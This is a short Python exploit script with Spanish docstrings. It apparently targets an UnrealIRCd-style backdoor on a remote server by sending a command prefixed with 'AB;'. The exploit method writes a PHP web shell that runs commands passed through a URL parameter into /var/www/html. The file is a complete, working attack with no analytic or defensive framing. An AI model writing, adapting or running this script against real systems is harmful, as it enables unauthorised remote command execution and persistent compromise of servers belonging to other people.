import socket

class Exploit:
    """Clase para gestionar la conexión y ejecución de un exploit en un servidor remoto.

    Attributes:
        host (str): El hostname o dirección IP del servidor objetivo.
        port (int): El puerto en el que el servidor está escuchando.
        sock (socket.socket): Objeto socket utilizado para la conexión de red.
    """
    
    def __init__(self, host, port):
        """Inicializa la instancia de Exploit con host y puerto específicos.

        Args:
            host (str): El hostname o dirección IP del servidor objetivo.
            port (int): El puerto en el que el servidor está escuchando.
        """
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        """Establece la conexión con el servidor objetivo.

        Returns:
            bool: True si la conexión fue exitosa, False en caso contrario.
        """
        try:
            self.sock = socket.create_connection((self.host, self.port))
            self.sock.recv(1024)  # Recibe la bienvenida o mensaje inicial del servidor.
            return True
        except Exception as e:
            print(f"Error al conectarse a {self.host} en el puerto {self.port}: {e}")
            return False
        
    def send_command(self, command):
        """Envía un comando al servidor conectado y recibe la respuesta.

        Args:
            command (str): El comando a enviar al servidor.

        Returns:
            str: La respuesta del servidor al comando enviado, o None si hubo un error.
        """
        try:
            self.sock.sendall(command.encode('utf-8'))
            return self.sock.recv(1024).decode('utf-8')
        except Exception as e:
            print(f"Error al enviar el comando {command}: {e}")
            return None
        
    def exploit(self):
        """Envía un payload específico al servidor para ejecutar un comando arbitrario.

        El payload es un comando que crea un archivo PHP en el servidor que puede ejecutar comandos pasados a través de una URL.
        """
        payload = "echo '<?php echo passthru($_GET[\"cmd\"]); ?>' > /var/www/html/unrealirc.php"
        respuesta = self.send_command(f"AB; {payload} \n")
        print(f"Exploit enviado. Respuesta del servicio: {respuesta}")

    def run(self):
        """Inicia el proceso de explotación después de establecer la conexión.

        Conecta primero al servidor. Si la conexión es exitosa, procede a enviar el exploit.
        """
        if self.connect():
            self.exploit()